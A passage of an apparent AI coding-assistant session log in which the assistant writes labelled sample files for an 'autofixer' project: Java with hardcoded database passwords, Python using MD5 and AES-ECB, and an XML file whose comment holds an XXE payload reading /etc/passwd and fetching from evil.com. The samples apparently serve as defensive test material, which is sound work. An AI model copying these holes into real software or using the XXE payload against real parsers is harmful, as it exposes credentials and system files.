String(java.util.Base64.getDecoder().decode(encodedPassword));\\n        String url = \\"jdbc:mysql://localhost:3306/mydb\\";\\n        return DriverManager.getConnection(url, \\"admin\\", password);\\n    }\\n\\n    // VULNERABLE: Commented out code with secrets\\n    public Connection connectUnsafeCommented() throws SQLException {\\n        // String password = \\"tempPassword123\\"; // Still visible in source!\\n        String url = \\"jdbc:mysql://localhost:3306/mydb\\";\\n        String username = System.getenv(\\"DB_USER\\");\\n        String password = System.getenv(\\"DB_PASS\\"); // Better but still check env vars\\n        return DriverManager.getConnection(url, username, password);\\n    }\\n\\n    // SAFE: Using environment variables\\n    public Connection connectSafe() throws SQLException {\\n        // SAFE: Credentials from environment variables (not in source code)\\n        String url = System.getenv(\\"DB_URL\\");\\n        String username = System.getenv(\\"DB_USER\\");\\n        String password = System.getenv(\\"DB_PASS\\");\\n        \\n        if (url == null || username == null || password == null) {\\n            throw new IllegalStateException(\\"Database credentials not configured\\");\\n        }\\n        \\n        return DriverManager.getConnection(url, username, password);\\n    }\\n\\n    // SAFE: Using configuration files (outside source code)\\n    public Connection connectSafeFromConfig(java.util.Properties config) throws SQLException {\\n        // SAFE: Load from external configuration file (gitignored)\\n        String url = config.getProperty(\\"db.url\\");\\n        String username = config.getProperty(\\"db.username\\");\\n        String password = config.getProperty(\\"db.password\\");\\n        \\n        return DriverManager.getConnection(url, username, password);\\n    }\\n\\n    // SAFE: Using secret management service\\n    public Connection connectSafeFromSecretManager() throws SQLException {\\n        // SAFE: Retrieve from secure secret management service\\n        // Example: AWS Secrets Manager, HashiCorp Vault, etc.\\n        SecretManager secretManager = new SecretManager();\\n        DatabaseCredentials creds = secretManager.getDatabaseCredentials(\\"prod-db\\");\\n        \\n        return DriverManager.getConnection(\\n            creds.getUrl(),\\n            creds.getUsername(),\\n            creds.getPassword()\\n        );\\n    }\\n\\n    // Helper class (example)\\n    static class SecretManager {\\n        public DatabaseCredentials getDatabaseCredentials(String secretName) {\\n            // Implementation would connect to secret management service\\n            // and retrieve credentials securely\\n            return new DatabaseCredentials();\\n        }\\n    }\\n\\n    static class DatabaseCredentials {\\n        public String getUrl() { return System.getenv(\\"DB_URL\\"); }\\n        public String getUsername() { return System.getenv(\\"DB_USER\\"); }\\n        public String getPassword() { return System.getenv(\\"DB_PASS\\"); }\\n    }\\n}"}",
          "result": "{"diff":{"chunks":[{"diffString":"- \\n+ import java.sql.Connection;\\n+ import java.sql.DriverManager;\\n+ import java.sql.SQLException;\\n+ \\n+ /**\\n+  * Sample Java code demonstrating hardcoded secrets vulnerability and fix\\n+  */\\n+ \\n+ public class HardcodedSecretsExample {\\n+ \\n+     // VULNERABLE: Hardcoded credentials\\n+     public Connection connectUnsafe() throws SQLException {\\n+         // UNSAFE: Hardcoded username and password in source code\\n+         String url = \\"jdbc:mysql://localhost:3306/mydb\\";\\n+         String username = \\"admin\\";\\n+         String password = \\"SuperSecret123!\\";  // Exposed in source code!\\n+         return DriverManager.getConnection(url, username, password);\\n+     }\\n+ \\n+     // VULNERABLE: Base64 encoded (not encrypted!)\\n+     public Connection connectUnsafeBase64() throws SQLException {\\n+         // UNSAFE: Base64 is encoding, not encryption - easily decoded\\n+         String encodedPassword = \\"cGFzc3dvcmQxMjM=\\";  // Still unsafe!\\n+         String password = new String(java.util.Base64.getDecoder().decode(encodedPassword));\\n+         String url = \\"jdbc:mysql://localhost:3306/mydb\\";\\n+         return DriverManager.getConnection(url, \\"admin\\", password);\\n+     }\\n+ \\n+     // VULNERABLE: Commented out code with secrets\\n+     public Connection connectUnsafeCommented() throws SQLException {\\n+         // String password = \\"tempPassword123\\"; // Still visible in source!\\n+         String url = \\"jdbc:mysql://localhost:3306/mydb\\";\\n+         String username = System.getenv(\\"DB_USER\\");\\n+         String password = System.getenv(\\"DB_PASS\\"); // Better but still check env vars\\n+         return DriverManager.getConnection(url, username, password);\\n+     }\\n+ \\n+     // SAFE: Using environment variables\\n+     public Connection connectSafe() throws SQLException {\\n+         // SAFE: Credentials from environment variables (not in source code)\\n+         String url = System.getenv(\\"DB_URL\\");\\n+         String username = System.getenv(\\"DB_USER\\");\\n+         String password = System.getenv(\\"DB_PASS\\");\\n+         \\n+         if (url == null || username == null || password == null) {\\n+             throw new IllegalStateException(\\"Database credentials not configured\\");\\n+         }\\n+         \\n+         return DriverManager.getConnection(url, username, password);\\n+     }\\n+ \\n+     // SAFE: Using configuration files (outside source code)\\n+     public Connection connectSafeFromConfig(java.util.Properties config) throws SQLException {\\n+         // SAFE: Load from external configuration file (gitignored)\\n+         String url = config.getProperty(\\"db.url\\");\\n+         String username = config.getProperty(\\"db.username\\");\\n+         String password = config.getProperty(\\"db.password\\");\\n+         \\n+         return DriverManager.getConnection(url, username, password);\\n+     }\\n+ \\n+     // SAFE: Using secret management service\\n+     public Connection connectSafeFromSecretManager() throws SQLException {\\n+         // SAFE: Retrieve from secure secret management service\\n+         // Example: AWS Secrets Manager, HashiCorp Vault, etc.\\n+         SecretManager secretManager = new SecretManager();\\n+         DatabaseCredentials creds = secretManager.getDatabaseCredentials(\\"prod-db\\");\\n+         \\n+         return DriverManager.getConnection(\\n+             creds.getUrl(),\\n+             creds.getUsername(),\\n+             creds.getPassword()\\n+         );\\n+     }\\n+ \\n+     // Helper class (example)\\n+     static class SecretManager {\\n+         public DatabaseCredentials getDatabaseCredentials(String secretName) {\\n+             // Implementation would connect to secret management service\\n+             // and retrieve credentials securely\\n+             return new DatabaseCredentials();\\n+         }\\n+     }\\n+ \\n+     static class DatabaseCredentials {\\n+         public String getUrl() { return System.getenv(\\"DB_URL\\"); }\\n+         public String getUsername() { return System.getenv(\\"DB_USER\\"); }\\n+         public String getPassword() { return System.getenv(\\"DB_PASS\\"); }\\n+     }\\n+ }","oldStart":1,"newStart":1,"oldLines":1,"newLines":90,"linesRemoved":1,"linesAdded":90}],"editor":"EDITOR_AI"},"shouldAutoFixLints":true,"resultForModel":"Wrote contents to /Users/jonathanafek/src/autofixer/sample_hardcoded_secrets.java.","contentsAfterEdit":"import java.sql.Connection;\\nimport java.sql.DriverManager;\\nimport java.sql.SQLException;\\n\\n/**\\n * Sample Java code demonstrating hardcoded secrets vulnerability and fix\\n */\\n\\npublic class HardcodedSecretsExample {\\n\\n    // VULNERABLE: Hardcoded credentials\\n    public Connection connectUnsafe() throws SQLException {\\n        // UNSAFE: Hardcoded username and password in source code\\n        String url = \\"jdbc:mysql://localhost:3306/mydb\\";\\n        String username = \\"admin\\";\\n        String password = \\"SuperSecret123!\\";  // Exposed in source code!\\n        return DriverManager.getConnection(url, username, password);\\n    }\\n\\n    // VULNERABLE: Base64 encoded (not encrypted!)\\n    public Connection connectUnsafeBase64() throws SQLException {\\n        // UNSAFE: Base64 is encoding, not encryption - easily decoded\\n        String encodedPassword = \\"cGFzc3dvcmQxMjM=\\";  // Still unsafe!\\n        String password = new String(java.util.Base64.getDecoder().decode(encodedPassword));\\n        String url = \\"jdbc:mysql://localhost:3306/mydb\\";\\n        return DriverManager.getConnection(url, \\"admin\\", password);\\n    }\\n\\n    // VULNERABLE: Commented out code with secrets\\n    public Connection connectUnsafeCommented() throws SQLException {\\n        // String password = \\"tempPassword123\\"; // Still visible in source!\\n        String url = \\"jdbc:mysql://localhost:3306/mydb\\";\\n        String username = System.getenv(\\"DB_USER\\");\\n        String password = System.getenv(\\"DB_PASS\\"); // Better but still check env vars\\n        return DriverManager.getConnection(url, username, password);\\n    }\\n\\n    // SAFE: Using environment variables\\n    public Connection connectSafe() throws SQLException {\\n        // SAFE: Credentials from environment variables (not in source code)\\n        String url = System.getenv(\\"DB_URL\\");\\n        String username = System.getenv(\\"DB_USER\\");\\n        String password = System.getenv(\\"DB_PASS\\");\\n        \\n        if (url == null || username == null || password == null) {\\n            throw new IllegalStateException(\\"Database credentials not configured\\");\\n        }\\n        \\n        return DriverManager.getConnection(url, username, password);\\n    }\\n\\n    // SAFE: Using configuration files (outside source code)\\n    public Connection connectSafeFromConfig(java.util.Properties config) throws SQLException {\\n        // SAFE: Load from external configuration file (gitignored)\\n        String url = config.getProperty(\\"db.url\\");\\n        String username = config.getProperty(\\"db.username\\");\\n        String password = config.getProperty(\\"db.password\\");\\n        \\n        return DriverManager.getConnection(url, username, password);\\n    }\\n\\n    // SAFE: Using secret management service\\n    public Connection connectSafeFromSecretManager() throws SQLException {\\n        // SAFE: Retrieve from secure secret management service\\n        // Example: AWS Secrets Manager, HashiCorp Vault, etc.\\n        SecretManager secretManager = new SecretManager();\\n        DatabaseCredentials creds = secretManager.getDatabaseCredentials(\\"prod-db\\");\\n        \\n        return DriverManager.getConnection(\\n            creds.getUrl(),\\n            creds.getUsername(),\\n            creds.getPassword()\\n        );\\n    }\\n\\n    // Helper class (example)\\n    static class SecretManager {\\n        public DatabaseCredentials getDatabaseCredentials(String secretName) {\\n            // Implementation would connect to secret management service\\n            // and retrieve credentials securely\\n            return new DatabaseCredentials();\\n        }\\n    }\\n\\n    static class DatabaseCredentials {\\n        public String getUrl() { return System.getenv(\\"DB_URL\\"); }\\n        public String getUsername() { return System.getenv(\\"DB_USER\\"); }\\n        public String getPassword() { return System.getenv(\\"DB_PASS\\"); }\\n    }\\n}\\n"}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T17:19:57.409Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "read_lints",
          "parameters": "{"paths":["sample_command_injection.sh","sample_hardcoded_secrets.java"]}",
          "rawArguments": "{"paths": ["sample_command_injection.sh","sample_hardcoded_secrets.java"]}",
          "result": "{}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T17:20:14.259Z,
        "text": "Created 2 sample code files in the repo root:

1. **\`sample_command_injection.sh\`** — Command injection vulnerabilities in bash/shell scripts, including:
   - Unsafe use of \`eval\` with user input
   - Unsafe command execution with backticks
   - Safe input validation and quoting
   - Safe use of arrays for command arguments
   - Whitelist pattern matching

2. **\`sample_hardcoded_secrets.java\`** — Hardcoded secrets in Java, including:
   - Unsafe hardcoded credentials in source code
   - Unsafe Base64-encoded passwords (encoding is not encryption)
   - Safe use of environment variables
   - Safe use of external configuration files
   - Safe use of secret management services

Both files show vulnerable patterns and their secure alternatives, covering command injection and hardcoded secrets.",
        "tokens": {
          "inputCount": 44004,
          "outputCount": 1703,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [
          {
            "relativePath": "sample_command_injection.sh",
            "startLine": 1,
          },
          {
            "relativePath": "sample_hardcoded_secrets.java",
            "startLine": 1,
          },
        ],
        "date": 2025-10-29T17:23:31.169Z,
        "text": "lets add 2 more files",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "USER_PROMPT",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T17:23:35.444Z,
        "text": "Adding 2 more sample code files to the repo root:
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T17:23:35.541Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": true,
          "name": "write",
          "parameters": "{"relativeWorkspacePath":"/Users/jonathanafek/src/autofixer/sample_xxe_vulnerable.xml"}",
          "rawArguments": "{"file_path": "/Users/jonathanafek/src/autofixer/sample_xxe_vulnerable.xml", "contents": "<?xml version=\\"1.0\\" encoding=\\"UTF-8\\"?>\\n<!--\\nSample XML demonstrating XXE (XML External Entity) vulnerability and safe configuration\\n-->\\n\\n<!-- VULNERABLE: XML with external entity references -->\\n<!--\\n<?xml version=\\"1.0\\" encoding=\\"UTF-8\\"?>\\n<!DOCTYPE root [\\n  <!ENTITY xxe SYSTEM \\"file:///etc/passwd\\">\\n  <!ENTITY xxe2 SYSTEM \\"http://evil.com/steal.xml\\">\\n  <!ENTITY xxe3 SYSTEM \\"file:///c:/windows/win.ini\\">\\n]>\\n<root>\\n  <data>&xxe;</data>\\n  <data>&xxe2;</data>\\n  <data>&xxe3;</data>\\n</root>\\n-->\\n\\n<!-- SAFE: XML without external entity declarations -->\\n<root>\\n  <data>Safe content without external entities</data>\\n  <user>\\n    <name>John Doe</name>\\n    <email>john@example.com</email>\\n  </user>\\n</root>\\n\\n<!-- \\nSAFE XML Processing Guidelines:\\n\\n1. Disable DTD processing entirely:\\n   - Set feature http://apache.org/xml/features/disallow-doctype-decl to true\\n   - Set feature http://xml.org/sax/features/external-general-entities to false\\n   - Set feature http://xml.org/sax/features/external-parameter-entities to false\\n\\n2. Java Example (Safe):\\n   DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\\n   factory.setFeature(\\"http://apache.org/xml/features/disallow-doctype-decl\\", true);\\n   factory.setFeature(\\"http://xml.org/sax/features/external-general-entities\\", false);\\n   factory.setFeature(\\"http://xml.org/sax/features/external-parameter-entities\\", false);\\n\\n3. Python Example (Safe):\\n   from defusedxml import ElementTree\\n   tree = ElementTree.parse(xml_file)  # Uses defusedxml - safe by default\\n\\n4. Never process XML from untrusted sources without proper configuration!\\n-->"}",
          "result": "{"diff":{"chunks":[{"diffString":"- \\n+ <?xml version=\\"1.0\\" encoding=\\"UTF-8\\"?>\\n+ <!--\\n+ Sample XML demonstrating XXE (XML External Entity) vulnerability and safe configuration\\n+ -->\\n+ \\n+ <!-- VULNERABLE: XML with external entity references -->\\n+ <!--\\n+ <?xml version=\\"1.0\\" encoding=\\"UTF-8\\"?>\\n+ <!DOCTYPE root [\\n+   <!ENTITY xxe SYSTEM \\"file:///etc/passwd\\">\\n+   <!ENTITY xxe2 SYSTEM \\"http://evil.com/steal.xml\\">\\n+   <!ENTITY xxe3 SYSTEM \\"file:///c:/windows/win.ini\\">\\n+ ]>\\n+ <root>\\n+   <data>&xxe;</data>\\n+   <data>&xxe2;</data>\\n+   <data>&xxe3;</data>\\n+ </root>\\n+ -->\\n+ \\n+ <!-- SAFE: XML without external entity declarations -->\\n+ <root>\\n+   <data>Safe content without external entities</data>\\n+   <user>\\n+     <name>John Doe</name>\\n+     <email>john@example.com</email>\\n+   </user>\\n+ </root>\\n+ \\n+ <!-- \\n+ SAFE XML Processing Guidelines:\\n+ \\n+ 1. Disable DTD processing entirely:\\n+    - Set feature http://apache.org/xml/features/disallow-doctype-decl to true\\n+    - Set feature http://xml.org/sax/features/external-general-entities to false\\n+    - Set feature http://xml.org/sax/features/external-parameter-entities to false\\n+ \\n+ 2. Java Example (Safe):\\n+    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\\n+    factory.setFeature(\\"http://apache.org/xml/features/disallow-doctype-decl\\", true);\\n+    factory.setFeature(\\"http://xml.org/sax/features/external-general-entities\\", false);\\n+    factory.setFeature(\\"http://xml.org/sax/features/external-parameter-entities\\", false);\\n+ \\n+ 3. Python Example (Safe):\\n+    from defusedxml import ElementTree\\n+    tree = ElementTree.parse(xml_file)  # Uses defusedxml - safe by default\\n+ \\n+ 4. Never process XML from untrusted sources without proper configuration!\\n+ -->","oldStart":1,"newStart":1,"oldLines":1,"newLines":49,"linesRemoved":1,"linesAdded":49}],"editor":"EDITOR_AI"},"shouldAutoFixLints":true,"resultForModel":"Wrote contents to /Users/jonathanafek/src/autofixer/sample_xxe_vulnerable.xml.","contentsAfterEdit":"<?xml version=\\"1.0\\" encoding=\\"UTF-8\\"?>\\n<!--\\nSample XML demonstrating XXE (XML External Entity) vulnerability and safe configuration\\n-->\\n\\n<!-- VULNERABLE: XML with external entity references -->\\n<!--\\n<?xml version=\\"1.0\\" encoding=\\"UTF-8\\"?>\\n<!DOCTYPE root [\\n  <!ENTITY xxe SYSTEM \\"file:///etc/passwd\\">\\n  <!ENTITY xxe2 SYSTEM \\"http://evil.com/steal.xml\\">\\n  <!ENTITY xxe3 SYSTEM \\"file:///c:/windows/win.ini\\">\\n]>\\n<root>\\n  <data>&xxe;</data>\\n  <data>&xxe2;</data>\\n  <data>&xxe3;</data>\\n</root>\\n-->\\n\\n<!-- SAFE: XML without external entity declarations -->\\n<root>\\n  <data>Safe content without external entities</data>\\n  <user>\\n    <name>John Doe</name>\\n    <email>john@example.com</email>\\n  </user>\\n</root>\\n\\n<!-- \\nSAFE XML Processing Guidelines:\\n\\n1. Disable DTD processing entirely:\\n   - Set feature http://apache.org/xml/features/disallow-doctype-decl to true\\n   - Set feature http://xml.org/sax/features/external-general-entities to false\\n   - Set feature http://xml.org/sax/features/external-parameter-entities to false\\n\\n2. Java Example (Safe):\\n   DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\\n   factory.setFeature(\\"http://apache.org/xml/features/disallow-doctype-decl\\", true);\\n   factory.setFeature(\\"http://xml.org/sax/features/external-general-entities\\", false);\\n   factory.setFeature(\\"http://xml.org/sax/features/external-parameter-entities\\", false);\\n\\n3. Python Example (Safe):\\n   from defusedxml import ElementTree\\n   tree = ElementTree.parse(xml_file)  # Uses defusedxml - safe by default\\n\\n4. Never process XML from untrusted sources without proper configuration!\\n-->\\n"}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T17:23:35.541Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": true,
          "name": "write",
          "parameters": "{"relativeWorkspacePath":"/Users/jonathanafek/src/autofixer/sample_weak_crypto.py"}",
          "rawArguments": "{"file_path": "/Users/jonathanafek/src/autofixer/sample_weak_crypto.py", "contents": "\\"\\"\\"\\nSample Python code demonstrating weak cryptography vulnerabilities and fixes\\n\\"\\"\\"\\n\\nimport hashlib\\nimport secrets\\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\\nfrom cryptography.hazmat.backends import default_backend\\nfrom cryptography.hazmat.primitives import hashes\\nfrom cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC\\nimport base64\\n\\n# VULNERABLE: Using MD5 for password hashing\\ndef hash_password_unsafe_md5(password: str) -> str:\\n    # UNSAFE: MD5 is cryptographically broken and fast to brute-force\\n    return hashlib.md5(password.encode()).hexdigest()\\n\\n\\n# VULNERABLE: Using SHA1 for password hashing\\ndef hash_password_unsafe_sha1(password: str) -> str:\\n    # UNSAFE: SHA1 is broken and vulnerable to collision attacks\\n    return hashlib.sha1(password.encode()).hexdigest()\\n\\n\\n# VULNERABLE: Using SHA256 without salt or iteration\\ndef hash_password_unsafe_sha256(password: str) -> str:\\n    # UNSAFE: SHA256 is a fast hash, vulnerable to rainbow table attacks\\n    # UNSAFE: No salt means same passwords produce same hashes\\n    return hashlib.sha256(password.encode()).hexdigest()\\n\\n\\n# VULNERABLE: Weak encryption with ECB mode\\ndef encrypt_unsafe_ecb(data: bytes, key: bytes) -> bytes:\\n    # UNSAFE: ECB mode reveals patterns (same plaintext = same ciphertext)\\n    # UNSAFE: No IV (Initialization Vector) means deterministic encryption\\n    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())\\n    encryptor = cipher.encryptor()\\n    return encryptor.update(data) + encryptor.finalize()\\n\\n\\n# VULNERABLE: Hardcoded encryption key\\ndef encrypt_unsafe_hardcoded_key(data: bytes) -> bytes:\\n    # UNSAFE: Hardcoded key in source code\\n    key = b\\"1234567890123456\\"  # Exposed in source!\\n    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())\\n    encryptor = cipher.encryptor()\\n    return encryptor.update(data) + encryptor.finalize()\\n\\n\\n# SAFE: Using bcrypt for password hashing\\ndef hash_password_safe_bcrypt(password: str) -> str:\\n    # SAFE: bcrypt is designed for password hashing (slow, salted)\\n    import bcrypt\\n    salt = bcrypt.gensalt()\\n    hashed = bcrypt.hashpw(password.encode(), salt)\\n    return hashed.decode()\\n\\n\\n# SAFE: Using Argon2 for password hashing (modern standard)\\ndef hash_password_safe_argon2(password: str) -> str:\\n    # SAFE: Argon2 is the winner of Password Hashing Competition\\n    from argon2 import PasswordHasher\\n    ph = PasswordHasher()\\n    return ph.hash(password)\\n\\n\\n# SAFE: Using PBKDF2 with proper configuration\\ndef hash_password_safe_pbkdf2(password: str, salt: bytes = None) -> tuple[str, bytes]:\\n    # SAFE: PBKDF2 with high iteration count and random salt\\n    if salt is None:\\n        salt = secrets.token_bytes(16)\\n    \\n    kdf = PBKDF2HMAC(\\n        algorithm=hashes.SHA256(),\\n        length=32,\\n        salt=salt,\\n        iterations=100000,  # High iteration count slows brute-force\\n        backend=default_backend()\\n    )\\n    key = base64.b64encode(kdf.derive(password.encode())).decode()\\n    return key, salt\\n\\n\\n# SAFE: Using AES-GCM for encryption\\ndef encrypt_safe_gcm(data: bytes, key: bytes = None) -> tuple[bytes, bytes, bytes]:\\n    # SAFE: AES-GCM provides authenticated encryption\\n    if key is None:\\n        key = secrets.token_bytes(32)  # 256-bit key\\n    \\n    iv = secrets.token_bytes(12)  # 96-bit IV for GCM\\n    cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())\\n    encryptor = cipher.encryptor()\\n    ciphertext = encryptor.update(data) + encryptor.finalize()\\n    \\n    return ciphertext, encryptor.tag, iv\\n\\n\\n# SAFE: Verifying password hash\\ndef verify_password_bcrypt(password: str, hashed: str) -> bool:\\n    # SAFE: bcrypt verification handles salt automatically\\n    import bcrypt\\n    return bcrypt.checkpw(password.encode(), hashed.encode())\\n\\n\\n# SAFE: Key derivation from password\\ndef derive_key_from_password(password: str, salt: bytes = None) -> tuple[bytes, bytes]:\\n    # SAFE: Use proper key derivation function\\n    if salt is None:\\n        salt = secrets.token_bytes(16)\\n    \\n    kdf = PBKDF2HMAC(\\n        algorithm=hashes.SHA256(),\\n        length=32,\\n        salt=salt,\\n        iterations=100000,\\n        backend=default_backend()\\n    )\\n    key = kdf.derive(password.encode())\\n    return key, salt"}",
          "result": "{"diff":{"chunks":[{"diffString":"- \\n+ \\"\\"\\"\\n+ Sample Python code demonstrating weak cryptography vulnerabilities and fixes\\n+ \\"\\"\\"\\n+ \\n+ import hashlib\\n+ import secrets\\n+ from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\\n+ from cryptography.hazmat.backends import default_backend\\n+ from cryptography.hazmat.primitives import hashes\\n+ from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC\\n+ import base64\\n+ \\n+ # VULNERABLE: Using MD5 for password hashing\\n+ def hash_password_unsafe_md5(password: str) -> str:\\n+     # UNSAFE: MD5 is cryptographically broken and fast to brute-force\\n+     return hashlib.md5(password.encode()).hexdigest()\\n+ \\n+ \\n+ # VULNERABLE: Using SHA1 for password hashing\\n+ def hash_password_unsafe_sha1(password: str) -> str:\\n+     # UNSAFE: SHA1 is broken and vulnerable to collision attacks\\n+     return hashlib.sha1(password.encode()).hexdigest()\\n+ \\n+ \\n+ # VULNERABLE: Using SHA256 without salt or iteration\\n+ def hash_password_unsafe_sha256(password: str) -> str:\\n+     # UNSAFE: SHA256 is a fast hash, vulnerable to rainbow table attacks\\n+     # UNSAFE: No salt means same passwords produce same hashes\\n+     return hashlib.sha256(password.encode()).hexdigest()\\n+ \\n+ \\n+ # VULNERABLE: Weak encryption with ECB mode\\n+ def encrypt_unsafe_ecb(data: bytes, key: bytes) -> bytes:\\n+     # UNSAFE: ECB mode reveals patterns (same plaintext = same ciphertext)\\n+     # UNSAFE: No IV (Initialization Vector) means deterministic encryption\\n+     cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())\\n+     encryptor = cipher.encryptor()\\n+     return encryptor.update(data) + encryptor.finalize()\\n+ \\n+ \\n+ # VULNERABLE: Hardcoded encryption key\\n+ def encrypt_unsafe_hardcoded_key(data: bytes) -> bytes:\\n+     # UNSAFE: Hardcoded key in source code\\n+     key = b\\"1234567890123456\\"  # Exposed in source!\\n+     cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())\\n+     encryptor = cipher.encryptor()\\n+     return encryptor.update(data) + encryptor.finalize()\\n+ \\n+ \\n+ # SAFE: Using bcrypt for password hashing\\n+ def hash_password_safe_bcrypt(password: str) -> str:\\n+     # SAFE: bcrypt is designed for password hashing (slow, salted)\\n+     import bcrypt\\n+     salt = bcrypt.gensalt()\\n+     hashed = bcrypt.hashpw(password.encode(), salt)\\n+     return hashed.decode()\\n+ \\n+ \\n+ # SAFE: Using Argon2 for password hashing (modern standard)\\n+ def hash_password_safe_argon2(password: str) -> str:\\n+     # SAFE: Argon2 is the winner of Password Hashing Competition\\n+     from argon2 import PasswordHasher\\n+     ph = PasswordHasher()\\n+     return ph.hash(password)\\n+ \\n+ \\n+ # SAFE: Using PBKDF2 with proper configuration\\n+ def hash_password_safe_pbkdf2(password: str, salt: bytes = None) -> tuple[str, bytes]:\\n+     # SAFE: PBKDF2 with high iteration count and random salt\\n+     if salt is None:\\n+         salt = secrets.token_bytes(16)\\n+     \\n+     kdf = PBKDF2HMAC(\\n+         algorithm=hashes.SHA256(),\\n+         length=32,\\n+         salt=salt,\\n+         iterations=100000,  # High iteration count slows brute-force\\n+         backend=default_backend()\\n+     )\\n+     key = base64.b64encode(kdf.derive(password.encode())).decode()\\n+     return key, salt\\n+ \\n+ \\n+ # SAFE: Using AES-GCM for encryption\\n+ def encrypt_safe_gcm(data: bytes, key: bytes = None) -> tuple[bytes, bytes, bytes]:\\n+     # SAFE: AES-GCM provides authenticated encryption\\n+     if key is None:\\n+         key = secrets.token_bytes(32)  # 256-bit key\\n+     \\n+     iv = secrets.token_bytes(12)  # 96-bit IV for GCM\\n+     cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())\\n+     encryptor = cipher.encryptor()\\n+     ciphertext = encryptor.update(data) + encryptor.finalize()\\n+     \\n+     return ciphertext, encryptor.tag, iv\\n+ \\n+ \\n+ # SAFE: Verifying password hash\\n+ def verify_password_bcrypt(password: str, hashed: str) -> bool:\\n+     # SAFE: bcrypt verification handles salt automatically\\n+     import bcrypt\\n+     return bcrypt.checkpw(password.encode(), hashed.encode())\\n+ \\n+ \\n+ # SAFE: Key derivation from password\\n+ def derive_key_from_password(password: str, salt: bytes = None) -> tuple[bytes, bytes]:\\n+     # SAFE: Use proper key derivation function\\n+     if salt is None:\\n+         salt = secrets.token_bytes(16)\\n+     \\n+     kdf = PBKDF2HMAC(\\n+         algorithm=hashes.SHA256(),\\n+         length=32,\\n+         salt=salt,\\n+         iterations=100000,\\n+         backend=default_backend()\\n+     )\\n+     key = kdf.derive(password.encode())\\n+     return key, salt","oldStart":1,"newStart":1,"oldLines":1,"newLines":119,"linesRemoved":1,"linesAdded":119}],"editor":"EDITOR_AI"},"shouldAutoFixLints":true,"resultForModel":"Wrote contents to /Users/jonathanafek/src/autofixer/sample_weak_crypto.py.","contentsAfterEdit":"\\"\\"\\"\\nSample Python code demonstrating weak cryptography vulnerabilities and fixes\\n\\"\\"\\"\\n\\nimport hashlib\\nimport secrets\\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\\nfrom cryptography.hazmat.backends import default_backend\\nfrom cryptography.hazmat.primitives import hashes\\nfrom cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC\\nimport base64\\n\\n# VULNERABLE: Using MD5 for password hashing\\ndef hash_password_unsafe_md5(password: str) -> str:\\n    # UNSAFE: MD5 is cryptographically broken and fast to brute-force\\n    return hashlib.md5(password.encode()).hexdigest()\\n\\n\\n# VULNERABLE: Using SHA1 for password hashing\\ndef hash_password_unsafe_sha1(password: str) -> str:\\n    # UNSAFE: SHA1 is broken and vulnerable to collision attacks\\n    return hashlib.sha1(password.encode()).hexdigest()\\n\\n\\n# VULNERABLE: Using SHA256 without salt or iteration\\ndef hash_password_unsafe_sha256(password: str) -> str:\\n    # UNSAFE: SHA256 is a fast hash, vulnerable to rainbow table attacks\\n    # UNSAFE: No salt means same passwords produce same hashes\\n    return hashlib.sha256(password.encode()).hexdigest()\\n\\n\\n# VULNERABLE: Weak encryption with ECB mode\\ndef encrypt_unsafe_ecb(data: bytes, key: bytes) -> bytes:\\n    # UNSAFE: ECB mode reveals patterns (same plaintext = same ciphertext)\\n    # UNSAFE: No IV (Initialization Vector) means deterministic encryption\\n    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())\\n    encryptor = cipher.encryptor()\\n    return encryptor.update(data) + encryptor.finalize()\\n\\n\\n# VULNERABLE: Hardcoded encryption key\\ndef encrypt_unsafe_hardcoded_key(data: bytes) -> bytes:\\n    # UNSAFE: Hardcoded key in source code\\n    key = b\\"1234567890123456\\"  # Exposed in source!\\n    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())\\n    encryptor = cipher.encryptor()\\n    return encryptor.update(data) + encryptor.finalize()\\n\\n\\n# SAFE: Using bcrypt for password hashing\\ndef hash_password_safe_bcrypt(password: str) -> str:\\n    # SAFE: bcrypt is designed for password hashing (slow, salted)\\n    import bcrypt\\n    salt = bcrypt.gensalt()\\n    hashed = bcrypt.hashpw(password.encode(), salt)\\n    return hashed.decode()\\n\\n\\n# SAFE: Using Argon2 for password hashing (modern standard)\\ndef hash_password_safe_argon2(password: str) -> str:\\n    # SAFE: Argon2 is the winner of Password Hashing Competition\\n    from argon2 import PasswordHasher\\n    ph = PasswordHasher()\\n    return ph.hash(password)\\n\\n\\n# SAFE: Using PBKDF2 with proper configuration\\ndef hash_password_safe_pbkdf2(password: str, salt: bytes = None) -> tuple[str, bytes]:\\n    # SAFE: PBKDF2 with high iteration count and random salt\\n    if salt is None:\\n        salt = secrets.token_bytes(16)\\n    \\n    kdf = PBKDF2HMAC(\\n        